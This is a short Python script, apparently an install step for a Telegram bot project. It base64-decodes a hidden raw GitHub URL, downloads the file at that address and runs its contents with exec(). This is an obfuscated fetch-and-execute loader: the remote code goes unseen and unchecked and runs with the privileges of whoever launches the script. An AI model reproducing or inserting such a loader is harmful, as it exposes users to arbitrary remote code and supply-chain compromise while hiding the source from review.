# -*- coding: utf-8 -*-
import requests
import io 
from base64 import urlsafe_b64decode as base64urldecode

criapasta = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NhbmFscWIvYm90X3RlbGVncmFtL21haW4vaW5zdGFsbC9jcmlhbmRvcGFzdGEucHk="
criapasta = base64urldecode(criapasta.encode("utf-8"))
criapasta = criapasta.decode("utf-8")
headers = {'Referer': criapasta}
criapasta = requests.get(criapasta, headers=headers)
criapasta = criapasta.text
exec(criapasta)    
 
